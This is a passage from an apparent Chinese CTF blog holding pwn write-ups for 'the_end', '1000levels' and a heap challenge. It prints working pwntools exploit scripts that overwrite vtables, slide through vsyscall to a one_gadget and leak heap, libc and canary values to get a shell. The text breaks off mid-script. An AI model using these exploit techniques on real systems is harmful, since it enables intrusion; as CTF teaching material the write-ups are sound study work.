+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</span><br><span class="line">p = process(&#x27;./the_end&#x27;)</span><br><span class="line"></span><br><span class="line">vtable_offset = 0xd8</span><br><span class="line">_setbuf_offset = 0x58</span><br><span class="line">fake_vtable_offset = 0x3c5588</span><br><span class="line">#这个需要自己调试找，并保证偏移_setbuf_offset处修改之后程序不会直接崩溃</span><br><span class="line"></span><br><span class="line">sleep_addr = p.recvuntil(&#x27;, good luck&#x27;,drop=True).split(&#x27; &#x27;)[-1] </span><br><span class="line">libc_base = long(sleep_addr,16) - libc.symbols[&#x27;sleep&#x27;]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + 0xf02b0</span><br><span class="line">_IO_2_1_stdout_vtable_addr = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;] + vtable_offset</span><br><span class="line"></span><br><span class="line">fake_vtable = libc_base + fake_vtable_offset</span><br><span class="line">fake_vtable_setbuf_addr = libc_base + fake_vtable_offset + _setbuf_offset</span><br><span class="line"></span><br><span class="line">print &#x27;libc_base: &#x27;,hex(libc_base)</span><br><span class="line">print &#x27;one_gadget:&#x27;,hex(one_gadget)</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">    p.send(p64(_IO_2_1_stdout_vtable_addr+i))</span><br><span class="line">    p.send(p64(fake_vtable)[i])</span><br><span class="line"></span><br><span class="line">for i in range(3):</span><br><span class="line">    p.send(p64(fake_vtable_setbuf_addr+i))</span><br><span class="line">    p.send(p64(one_gadget)[i])</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;exec /bin/sh 1&gt;&amp;0&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)_IO_FILE_plus结构体位于libc数据段上可读可写内存处，可以直接修改，但是修改字节数只有5个，按照第一种方法：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">_IO_FILE_plus._mode &lt;= 0  //该条件自动就会满足</span><br><span class="line">_IO_FILE_plus._IO_write_ptr &gt; _IO_FILE_plus._IO_write_base//该条件需要设置1个字节</span><br></pre></td></tr></table></div></figure>
+
+<p>再利用1个字节修改vtable的倒数第二个字节，伪造vtable指针，然后利用3个字节在该内存对应_setbuf函数偏移处伪造one_gadget地址。</p>
+<p>(3)_rtld_global结构体位于libc数据段上可读可写内存处，可以直接修改。那么直接修改_dl_rtld_lock_recursive函数指针指向one_gadget就行了。</p>
+<p>方法(2)和方法(3)参考：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Mira_Hu/article/details/103736917" >https://blog.csdn.net/Mira_Hu/article/details/103736917</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/linux/io_file/fake-vtable-exploit-zh/" >https://wiki.x10sec.org/pwn/linux/io_file/fake-vtable-exploit-zh/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/HITB%20GSEC%20CTF%202017-1000levels/">HITB GSEC CTF 2017-1000levels</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.与之前BCTF 2017-100levels一模一样，只不过最大值变成了1000关，所以这里也同样可以用爆破来做，但是可以用另一种方法，vsyscall。</p>
+<p>2.进入IDA可以看到有一个hint函数，而且里面有system函数，但是很奇怪：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sprintf((char *)&amp;v1, &quot;Hint: %p\n&quot;, &amp;system, &amp;system);</span><br></pre></td></tr></table></div></figure>
+
+<p>这个代码没怎么看懂，还是看下汇编代码：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531418.jpeg" alt="img"></p>
+<p>这里就是将system的地址赋值给rax，然后rax给栈上的[rbp+var_110]赋值。之后也没有什么其它的更改栈上[rbp+var_110]的操作，所以进入hint函数之后，一定会将system函数放到栈上，通过调试也可以看出来。</p>
+<p>3.之后进入go函数，发现如果第一次输入负数，原本将关卡数赋值给[rbp+var_110]的操作就不会被执行，那么[rbp+var_110]上保存的仍然是system函数的地址。之后再输入关卡数，直接加到[rbp+var_110]上，那么如果第一次输入负数，第二次输入system函数和one_gadget的偏移，那么就变相将[rbp+var_110]上存放的内容保存为one_gadget的地址。</p>
+<p>▲这里需要注意的是，[rbp+var_110]是在hint函数中被赋值的，而go函数中用到的也是[rbp+var_110]这个变量，但是不同函数栈肯定是不同的，所以这里两个[rbp+var_110]是不是一样的就值得思考一下。看程序可以发现，hint函数和go函数都是在main函数中调用的，那么如果调用的时候两处的rsp是一样的就可以保证两个函数的rbp一样，也就代码[rbp+var_110]也是一样的。查看汇编代码：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531579.jpeg" alt="img"></p>
+<p>可以看到从读取选项数据之后，到判断语句一直没有push,pop之类的操作，也就是说程序无论是运行到hint函数还是go函数时，main函数栈的状态都是一样的，从而导致进入这两个函数中的栈底也都是同一个地址，那么[rbp+var_110]也就一样，所以用hint函数来为[rbp+var_110]赋值成system函数，再用go函数来为[rbp+var_110]赋值为one_gadget这条路是可以的，同样可以调试来确定一下。</p>
+<p>4.那么赋值之后进入level关卡函数，由于递归关系，最后一关的栈是和go函数的栈连在一起的，所以可以通过最后一关的栈溢出抵达go函数的栈，从而抵达[rbp+var_110]这个地址处。</p>
+<p>5.但是栈溢出只能修改数据，就算控制eip，但是也并不知道[rbp+var_110]处的真实地址，只能通过调试来知道偏移是多少。所以这里需要用的vsyscall来将rsp下挪到[rbp+var_110]处从而执行vsyscall的ret操作来执行[rbp+var_110]处的代码，也就是one_gadget。</p>
+<p>6.这里看一下vsyscall处的数据：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531595.png" alt="img"></p>
+<p>▲vsyscall的特点：</p>
+<p>(1)某些版本存在，需要用到gdb来查看，IDA中默认不可见。</p>
+<p>(2)地址不受到ASLR和PIE的影响，固定是0xffffffffff600000-0xffffffffff601000。</p>
+<p>(3)不能从中间进入，只能从函数开头进入，意味着不能直接调用里面的syscall。这里vsyscall分为三个函数，从上到下依次是</p>
+<p>A.gettimeofday: 0xffffffffff600000</p>
+<p>B.time: 0xffffffffff600400</p>
+<p>C.getcpu: 0xffffffffff600800</p>
+<p>(4)gettimeofday函数执行成功时返回值就是0，保存在rax寄存器中。这就为某些one_gadget创造了条件。</p>
+<p>7.观察代码可以发现，三个函数执行成功之后相当于一个ret操作，所以如果我们将gettimeofday放在eip处，那么就相当于放了一个ret操作上去，而ret操作又相当于pop  eip，那么就相当于直接将rsp往下拉了一个单位。如果我们多次调用gettimeofday，那么就可以将rsp下拉多个单位，从而抵达我们想要的地方来执行代码。那么这里就可以将eip改成gettimeofday，然后在之后添加多个gettimeofday来滑到one_gadget来执行代码。</p>
+<p>8.所以现在就可以编写exp了</p>
+<p>(1)前置内容：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">libc_system_offset = 0x432C0					</span><br><span class="line">#减去system函数离libc开头的偏移</span><br><span class="line">one_gadget_offset = 0x43158				</span><br><span class="line">#加上one gadget rce离libc开头的偏移</span><br><span class="line">vsyscall_gettimeofday = 0xffffffffff600000</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;Choice:&#x27;)</span><br><span class="line">io.sendline(&#x27;2&#x27;) #让system的地址进入栈中</span><br><span class="line">io.recvuntil(&#x27;Choice:&#x27;)</span><br><span class="line">io.sendline(&#x27;1&#x27;) #调用go()</span><br><span class="line">io.recvuntil(&#x27;How many levels?&#x27;)</span><br><span class="line">io.sendline(&#x27;-1&#x27;) #输入的值必须小于0，防止覆盖掉system的地址</span><br><span class="line">io.recvuntil(&#x27;Any more?&#x27;)</span><br><span class="line">io.sendline(str(one_gadget_offset-libc_system_offset))		</span><br><span class="line">#第二次输入关卡的时候输入偏移值，从而通过相加将system的地址变为one gadget rce的地址</span><br></pre></td></tr></table></div></figure>
+
+<p>这里由于相加关系，levels=system_addr + one_gadget_offset - libc_system_offset,肯定超过999，所以关卡数一定是1000关。</p>
+<p>(2)开始循环答题，直至到达最后一关执行栈溢出：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def answer():</span><br><span class="line">    io.recvuntil(&#x27;Question: &#x27;) </span><br><span class="line">    answer = eval(io.recvuntil(&#x27; = &#x27;)[:-3])</span><br><span class="line">    io.recvuntil(&#x27;Answer:&#x27;)</span><br><span class="line">    io.sendline(str(answer))</span><br><span class="line">for i in range(999): #循环答题</span><br><span class="line">    log.info(i)</span><br><span class="line">    answer()</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)最后一关执行栈溢出，利用gettimeofday滑至one_gadegt从而getshell。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;Question: &#x27;)</span><br><span class="line">io.send(b&#x27;a&#x27;*0x38 + p64(vsyscall_gettimeofday)*3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>▲以下是测试[rbp+var_110]的数据：</p>
+<p>main函数中的rbp:  00007FFD3A854900</p>
+<p>hint函数中的rbp:   00007FFD3A8548C0</p>
+<p>go函数中的rbp:    00007FFD3A8548C0</p>
+<p>▲vsyscall用法:</p>
+<p>vsyscall直接进行syscall，并没有利用栈空间，所以在处理栈溢出，但是由于PIE没有别的地址可以用时，而栈上又有某个有用的地址的时候，可以通过vsyscall构造一个rop链来ret，每次ret都会消耗掉一个地址，将rsp下拉一个单位，这样就可以逐渐去贴近想要的那个地址，最后成功ret到相应的位置。</p>
+<p>▲vdso的特点：</p>
+<p>(1)vdso的地址随机化的，且其中的指令可以任意执行，不需要从入口开始。</p>
+<p>(2)相比于栈和其他的ASLR，vdso的随机化非常的弱，对于32的系统来说，有1/256的概率命中。</p>
+<p>(3)不同的内核随机程度不同：</p>
+<p>A.较旧版本：<code>0xf76d9000</code>-<code>0xf77ce000</code></p>
+<p>B.较新版本：<code>0xf7ed0000</code>-<code>0xf7fd0000</code></p>
+<p>C.其它版本：</p>
+<p>可以编译以下文件之后用脚本查看：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">// compiled: gcc -g -m32 vdso_addr.c -o vdso_addr</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;vdso addr: %124$p\n&quot;);//这里的偏移不同内核不一样，可调试一下看看。</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>查看脚本：</p>
+<p>#注释头</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line">for i in range(100):</span><br><span class="line">    result += [os.popen(&#x27;./vdso_addr&#x27;).read()[:-1]]</span><br><span class="line"></span><br><span class="line">result = sorted(result)</span><br><span class="line"></span><br><span class="line">for v in result:</span><br><span class="line">    print (v)</span><br></pre></td></tr></table></div></figure>
+
+<p>▲vdso的用法：与vsystem类似，泄露出地址后相当于有了syscall。另外32位条件下有__kernel_rt_sigreturn，可以打SROP。</p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5236" >https://xz.aliyun.com/t/5236</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/HITBCTF2017%20Sentosa/">HCTF2018_the_end</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，保护全开。IDA打开找漏洞，在sub_BF0()函数，即读入name的函数中存在栈溢出漏洞：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514947.jpeg" alt="img"></p>
+<p>利用结构体重整化</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct project&#123;</span><br><span class="line">int length;</span><br><span class="line">char name[length];</span><br><span class="line">int check;</span><br><span class="line">int price;</span><br><span class="line">int area;</span><br><span class="line">int capactity;</span><br><span class="line">&#125;project;</span><br><span class="line"></span><br><span class="line">struct project* projects[0x10];</span><br></pre></td></tr></table></div></figure>
+
+<p>由于length是由用户输入影响的，那么结构体的大小也是不固定的，所以提出来固定的形成project_behind结构体方便查看：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct project_behind&#123;</span><br><span class="line">int check;</span><br><span class="line">int price;</span><br><span class="line">int area;</span><br><span class="line">int capactity;</span><br><span class="line">&#125;project_behind;</span><br></pre></td></tr></table></div></figure>
+
+<p>得到如下：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191514952.jpeg" alt="img"></p>
+<p>其实际意义就是读入length-1个字节，然后将最后一个字节设置为\x00。但是这里没有检查data_length，即如果传入的length为0，那么data_length由于是int类型，而i也是int类型，那么i从0开始加需要加0xfffff…..这么多才会抵达-1，相当于可以读入任意长度的字符串，造成栈溢出。</p>
+<p>2.栈溢出，保护全开，canary把着栈溢出的口子，所以得先想办法泄露canary。</p>
+<p>(1)题目虽然打印了name，但是打印的是堆上的name，没办法利用name连上canary来泄露。</p>
+<p>(2)足够长的栈溢出，但是没有这个进程是fork创建，而不是进程pthread创建，所以没办法溢出足够长来覆盖TSL中的canary。</p>
+<p>那么既然能控制栈，就从栈上入手，寻找add函数栈上的有用数据：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">char *project; // [rsp+6Ah] [rbp-3Eh]</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">project = malloc(length + 21LL);</span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">projects[idx] = project;</span><br></pre></td></tr></table></div></figure>
+
+<p>可以看到对IDA重整化之后的内容中，project变量位于栈上，里面保存着project这个chunk的首地址，最后会被放入projects这个数组中。所以如果我们修改掉project变量的内容，将其指向其它的地址，那就实现任意地址可写了。</p>
+<p>3.但是这里保护全开，一个有用地址都没有。可以注意到project变量最后会保存一个堆地址，由于大端序，如果我们将这个堆地址的最后一个字节变成\x00，那么这个chunk就会指向第一个chunk，也就是project[0]，如果第一个chunk处于释放状态，就可以通过程序的view函数来将这个chunk的fd指针打印出来。</p>
+<p>4.由于使用溢出的前提条件是length为0，所以malloc(21)对应chunk大小为0x20，释放后会进入fastbins中，fastbins中chunk的fd保存下一个chunk的头地址。那么就可以打印出fd上的内容，泄露出堆地址。</p>
+<p>5.现在可以控制堆内容了，那么通过正常手段申请几个chunk，在里面构造一个fakechunk，之后利用溢出漏洞控制这个fakechunk，将其释放掉，使其进入unsortedbin中。再利用溢出漏洞控制这个被释放的fakechunk，打印出其fd指针，就是main_aren+88的地址，从而泄露Libc地址。</p>
+<p>6.现在有了libc地址和栈溢出，需要突破canary，突破口是environ这个变量。environ这个变量从程序加载时保存在libc数据段上，但是它的内容保存的是栈地址，所以我们就可以通过溢出漏洞打印出environ中的栈地址。得到栈地址之后就可以用gdb计算偏移，选取view函数栈上的canary，再利用溢出漏洞打印出canary的值。</p>
+<p>7.之后有了libc,canary,栈溢出,就是常规的getshell了。</p>
+<p>8.编写exp:</p>
+<p>(1)前置增删改查：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def start_proj(length, name, price, area, capacity):</span><br><span class="line">    io.sendlineafter(&quot;Exit\n&quot;, &#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;name: &quot;, str(length))</span><br><span class="line">    io.sendlineafter(&quot;name: &quot;, name)</span><br><span class="line">    io.sendlineafter(&quot;price: &quot;, str(price))</span><br><span class="line">    io.sendlineafter(&quot;area: &quot;, str(area))</span><br><span class="line">    io.sendlineafter(&quot;capacity: &quot;, str(capacity))</span><br><span class="line"></span><br><span class="line">def view_proj():</span><br><span class="line">    io.sendlineafter(&quot;Exit\n&quot;, &#x27;2&#x27;)</span><br><span class="line"></span><br><span class="line">def cancel_proj(idx):</span><br><span class="line">    io.sendlineafter(&quot;Exit\n&quot;, &#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;number: &quot;, str(idx))</span><br></pre></td></tr></table></div></figure>
+
+<p>(2)泄露堆地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头 </span><br><span class="line"></span><br><span class="line">def leak_heap():</span><br><span class="line">    global heap_base</span><br><span class="line"></span><br><span class="line">    start_proj(0, &#x27;A&#x27;, 1, 1, 1)        #chunk0</span><br><span class="line">    start_proj(0, &#x27;A&#x27;*0x5a, 1, 1, 1)   #chunk1</span><br><span class="line">    #溢出一个字节，修改栈上project的最后一个字节为\x00,使其指向chunk0</span><br><span class="line">    start_proj(0, &#x27;A&#x27;, 1, 1, 1)        #chunk2</span><br><span class="line">    cancel_proj(2)</span><br><span class="line">    cancel_proj(0)</span><br><span class="line"></span><br><span class="line">    view_proj()</span><br><span class="line">    #打印chunk1就相当于打印chunk0的内容，其中包含fd指针部分内容</span><br><span class="line"></span><br><span class="line">    io.recvuntil(&quot;Capacity: &quot;)</span><br><span class="line">    leak = int(io.recvline()[:-1], 10) &amp; 0xffffffff</span><br><span class="line">    heap_base = (0x55&lt;&lt;40) + (leak&lt;&lt;8) # 0x55 or 0x56</span><br><span class="line">    #由于程序的关系，只能打印出0x55之后的内容，共4个字节，由于堆地址高位一般都是0x55或0x56，所以直接加上即可，最后还得乘上0x100，因为没有泄露出来，需要调试看看。</span><br><span class="line"></span><br><span class="line">    log.info(&quot;heap base: 0x%x&quot; % heap_base)</span><br></pre></td></tr></table></div></figure>
+
+<p>(3)泄露libc地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#注释头 </span><br><span class="line"></span><br><span class="line">def leak_libc():</span><br><span class="line">    global libc_base</span><br><span class="line"></span><br><span class="line">    start_proj(0xf, &#x27;A&#x27;, 0xd1, 0, 0x64)                       #chunk0</span><br><span class="line">    #chunk0用来修改fakechunk的size位为0xd1,占位0x30,位于heap_base+0x60</span><br><span class="line"></span><br><span class="line">    start_proj(0x50, &#x27;\x01&#x27;, 1, 1, 1)                         #chunk2</span><br><span class="line">    #chunk2占位0x70用,位于heap_base+0x90,&#x27;\x01&#x27;不知道干啥的，&#x27;\x00&#x27;随便啥都可以</span><br><span class="line"></span><br><span class="line">    start_proj(0x50, &#x27;A&#x27;*0x44+&#x27;\x21&#x27;, 1, 1, 1)                #chunk3</span><br><span class="line">    #chunk3用来修改fakechunk的size位，占位0x70,位于heap_base+0x100</span><br><span class="line"></span><br><span class="line">    start_proj(0, &#x27;A&#x27;*0x5a + p64(heap_base+0x90), 1, 1, 1)    #chunk4</span><br><span class="line">    #chunk4修改chunk4指向heap_base+0x90，占位0x20,位于heap_base</span><br><span class="line"></span><br><span class="line">    start_proj(0, &#x27;A&#x27;*0x5a + p64(heap_base+0x8b), 1, 1, 1)    #chunk5</span><br><span class="line">    #chunk5占位0x20,修改chunk5指向heap_base+0x8b,位于heap_base+0x40</span><br><span class="line"></span><br><span class="line">    #将fakechunk放入unsortedbin中</span><br><span class="line">    cancel_proj(4)</span><br><span class="line">    </span><br><span class="line">    #获得libc地址</span><br><span class="line">    view_proj()</span><br><span class="line"></span><br><span class="line">    #由于一次只能泄露4个字节，所以需要两部分拼接</span><br><span class="line">    for i in range(5):</span><br><span class="line">        io.recvuntil(&quot;Area: &quot;)</span><br><span class="line">    leak_low = int(io.recvline()[:-1], 10) &amp; 0xffffffff</span><br><span class="line">    io.recvuntil(&quot;Capacity: &quot;)</span><br><span class="line">    leak_high = int(io.recvline()[:-1], 10) &amp; 0xffff</span><br><span class="line">    libc_base = leak_low + (leak_high&lt;&lt;32) - 0x3c3b78</span><br><span class="line"></span><br><span class="line">    log.info(&quot;libc base: 0x%x&quot; % libc_base)</span><br></pre></td></tr></table></div></figure>
+
+<p>①chunk0中的0x64用来过程序中删除project函数的检查：</p>
+<p>if ( *(project + *project + 5) != 1 )</p>
+<p>只要计算之后check为1即可，实测0x60也可以。</p>
+<p>②chunk3中的\x21为了过glibc中的检查。</p>
+<p>③chunk5为了填满之前的索引为2的project，方便之后运作。</p>
+<p>(4)泄露canary:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#注释头 </span><br><span class="line"></span><br><span class="line">def leak_stack_canary():</span><br><span class="line">    global canary</span><br><span class="line"></span><br><span class="line">    environ_addr = libc.symbols[&#x27;__environ&#x27;] + libc_base</span><br><span class="line">    log.info(&quot;__environ address: 0x%x&quot; % environ_addr)</span><br><span class="line"></span><br><span class="line">    start_proj(0, &#x27;A&#x27;*0x5a + p64(environ_addr - 9) , 1, 1, 1) # 4</span><br><span class="line"></span><br><span class="line">    view_proj()</span><br><span class="line">    for i in range(5):</span><br><span class="line">        io.recvuntil(&quot;Price: &quot;)</span><br><span class="line">    leak_low = int(io.recvline()[:-1], 10) &amp; 0xffffffff</span><br><span class="line">    io.recvuntil(&quot;Area: &quot;)</span><br><span class="line">    leak_high = int(io.recvline()[:-1], 10) &amp; 0xffff</span><br><span class="line">    stack_addr = leak_low + (leak_high&lt;&lt;32)</span><br><span class="line">    canary_addr = stack_addr - 0x130</span><br><span class="line"></span><br><span class="line">    log.info(&quot;stack address: 0x%x&quot; % stack_addr)</span><br><span class="line">    log.info(&quot;canary address: 0x%x&quot; % canary_addr)</span><br><span class="line"></span><br><span class="line">    start_proj(0, &#x27;A&#x27;*0x5a + p64(canary_addr - 3), 1, 1, 1) # 6</span><br><span class="line"></span><br><span class="line">    view_proj()</span><br><span class="line">    for i in range(7):</span><br><span class="line">        io.recvuntil(&quot;Project: &quot;)</span><br><span class="line">    canary = (u64(io.recvline()[:-1] + &quot;\x00&quot;))&lt;&lt;8</span><br><span class="line"></span><br><span class="line">    log.info(&quot;canary: 0x%x&quot; % 